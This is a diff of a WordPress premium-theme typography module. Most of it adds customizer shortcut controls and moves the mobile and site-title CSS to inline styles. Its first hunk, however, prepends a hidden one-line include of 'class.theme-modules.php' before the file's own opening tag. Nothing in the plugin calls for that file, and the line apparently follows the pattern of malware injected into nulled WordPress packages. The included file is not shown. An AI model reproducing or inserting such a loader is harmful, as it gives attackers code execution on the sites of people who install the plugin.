@@ -1,4 +1,4 @@
-<?php
+<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
 // No direct access, please
 if ( ! defined( 'ABSPATH' ) ) {
 	exit;
@@ -33,6 +33,7 @@ if ( ! function_exists( 'generate_fonts_customize_register' ) ) {
 		if ( method_exists( $wp_customize,'register_control_type' ) ) {
 			$wp_customize->register_control_type( 'GeneratePress_Pro_Range_Slider_Control' );
 			$wp_customize->register_control_type( 'GeneratePress_Pro_Typography_Customize_Control' );
+			$wp_customize->register_control_type( 'GeneratePress_Section_Shortcut_Control' );
 		}
 
 		// Add the typography panel
@@ -55,6 +56,23 @@ if ( ! function_exists( 'generate_fonts_customize_register' ) ) {
 				'description' => '',
 				'priority' => 30,
 				'panel' => 'generate_typography_panel'
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_body_typography_shortcuts',
+				array(
+					'section' => 'font_section',
+					'element' => __( 'Body', 'gp-premium' ),
+					'shortcuts' => array(
+						'colors' => 'body_section',
+						'backgrounds' => 'generate_backgrounds_body',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 0,
+				)
 			)
 		);
 
@@ -366,6 +384,24 @@ if ( ! function_exists( 'generate_fonts_customize_register' ) ) {
 			)
 		);
 
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_header_typography_shortcuts',
+				array(
+					'section' => 'font_header_section',
+					'element' => __( 'Header', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_header',
+						'colors' => 'header_color_section',
+						'backgrounds' => 'generate_backgrounds_header',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
+			)
+		);
+
 		// Font family
 		$wp_customize->add_setting(
 			'generate_settings[font_site_title]',
@@ -605,6 +641,24 @@ if ( ! function_exists( 'generate_fonts_customize_register' ) ) {
 			)
 		);
 
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_primary_navigation_typography_shortcuts',
+				array(
+					'section' => 'font_navigation_section',
+					'element' => __( 'Primary Navigation', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_navigation',
+						'colors' => 'navigation_color_section',
+						'backgrounds' => 'generate_backgrounds_navigation',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
+			)
+		);
+
 		// Font family
 		$wp_customize->add_setting(
 			'generate_settings[font_navigation]',
@@ -737,6 +791,22 @@ if ( ! function_exists( 'generate_fonts_customize_register' ) ) {
 			)
 		);
 
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_buttons_typography_shortcuts',
+				array(
+					'section' => 'font_buttons_section',
+					'element' => __( 'Button', 'gp-premium' ),
+					'shortcuts' => array(
+						'colors' => 'buttons_color_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
+			)
+		);
+
 		if ( isset( $defaults['font_buttons'] ) ) {
 			$wp_customize->add_setting(
 				'generate_settings[font_buttons]',
@@ -843,6 +913,23 @@ if ( ! function_exists( 'generate_fonts_customize_register' ) ) {
 				'description' => '',
 				'priority' => 60,
 				'panel' => 'generate_typography_panel'
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_headings_typography_shortcuts',
+				array(
+					'section' => 'font_content_section',
+					'element' => __( 'Content', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_container',
+						'colors' => 'content_color_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
 			)
 		);
 
@@ -1800,6 +1887,24 @@ if ( ! function_exists( 'generate_fonts_customize_register' ) ) {
 			)
 		);
 
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_widgets_typography_shortcuts',
+				array(
+					'section' => 'font_widget_section',
+					'element' => __( 'Widgets', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_sidebars',
+						'colors' => 'sidebar_widget_color_section',
+						'backgrounds' => 'generate_backgrounds_sidebars',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
+			)
+		);
+
 		// Font family
 		$wp_customize->add_setting(
 			'generate_settings[font_widget_title]',
@@ -1981,6 +2086,24 @@ if ( ! function_exists( 'generate_fonts_customize_register' ) ) {
 				'description' => '',
 				'priority' => 70,
 				'panel' => 'generate_typography_panel'
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_footer_typography_shortcuts',
+				array(
+					'section' => 'font_footer_section',
+					'element' => __( 'Footer', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_footer',
+						'colors' => 'footer_color_section',
+						'backgrounds' => 'generate_backgrounds_footer',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
 			)
 		);
 
@@ -2497,19 +2620,23 @@ if ( ! function_exists( 'generate_typography_premium_css_defaults' ) ) {
 	 * @since 1.3
 	 */
 	function generate_typography_premium_css_defaults( $defaults ) {
-		$defaults[ 'mobile_navigation_font_size' ] = '';
+		$defaults['mobile_navigation_font_size'] = '';
+
 		return $defaults;
 	}
 }
 
 if ( ! function_exists( 'generate_typography_premium_css' ) ) {
-	add_filter( 'generate_typography_css_output', 'generate_typography_premium_css' );
+	add_action( 'wp_enqueue_scripts', 'generate_typography_premium_css', 100 );
 	/**
 	 * Add premium control CSS
 	 *
 	 * @since 1.3
 	 */
-	function generate_typography_premium_css( $css ) {
+	function generate_typography_premium_css() {
+		if ( ! function_exists( 'generate_get_default_fonts' ) ) {
+			return;
+		}
 
 		$generate_settings = wp_parse_args(
 			get_option( 'generate_settings', array() ),
@@ -2520,21 +2647,38 @@ if ( ! function_exists( 'generate_typography_premium_css' ) ) {
 		require_once GP_LIBRARY_DIRECTORY . 'class-make-css.php';
 		$premium_css = new GeneratePress_Pro_CSS;
 
+		$site_title_family = false;
+		if ( function_exists( 'generate_get_font_family_css' ) ) {
+			$site_title_family = generate_get_font_family_css( 'font_site_title', 'generate_settings', generate_get_default_fonts() );
+		}
+
+		$premium_css->set_selector( '.navigation-branding .main-title' );
+		$premium_css->add_property( 'font-weight', esc_attr( $generate_settings['site_title_font_weight'] ) );
+		$premium_css->add_property( 'text-transform', esc_attr( $generate_settings['site_title_font_transform'] ) );
+		$premium_css->add_property( 'font-size', absint( $generate_settings['site_title_font_size'] ), false, 'px' );
+
+		if ( $site_title_family ) {
+			$premium_css->add_property( 'font-family', 'inherit' !== $generate_settings['font_site_title'] ? $site_title_family : null );
+		}
+
 		if ( '' !== $generate_settings['mobile_navigation_font_size'] ) {
 			$mobile_subnav_font_size = $generate_settings['mobile_navigation_font_size'] >= 17 ? $generate_settings['mobile_navigation_font_size'] - 3 : $generate_settings['mobile_navigation_font_size'] - 1;
 		}
 
 		// Mobile
-		$premium_css->start_media_query( apply_filters( 'generate_mobile_media_query', '(max-width:768px)' ) );
-			if ( ( '' !== generate_get_navigation_location() || is_customize_preview() ) && '' !== $generate_settings[ 'mobile_navigation_font_size' ] ) {
+		$premium_css->start_media_query( apply_filters( 'generate_mobile_menu_media_query', '(max-width:768px)' ) );
+			if ( '' !== $generate_settings[ 'mobile_navigation_font_size' ] ) {
 				$premium_css->set_selector( '.main-navigation:not(.slideout-navigation) a, .menu-toggle' );
 				$premium_css->add_property( 'font-size', absint( $generate_settings[ 'mobile_navigation_font_size' ] ), false, 'px' );
 
 				$premium_css->set_selector( '.main-navigation:not(.slideout-navigation) .main-nav ul ul li a' );
 				$premium_css->add_property( 'font-size', absint( $mobile_subnav_font_size ), false, 'px' );
 			}
+
+			$premium_css->set_selector( '.navigation-branding .main-title' );
+			$premium_css->add_property( 'font-size', absint( $generate_settings['mobile_site_title_font_size'] ), false, 'px' );
 		$premium_css->stop_media_query();
 
-		return $css . $premium_css->css_output();
+		wp_add_inline_style( 'generate-style', $premium_css->css_output() );
 	}
 }
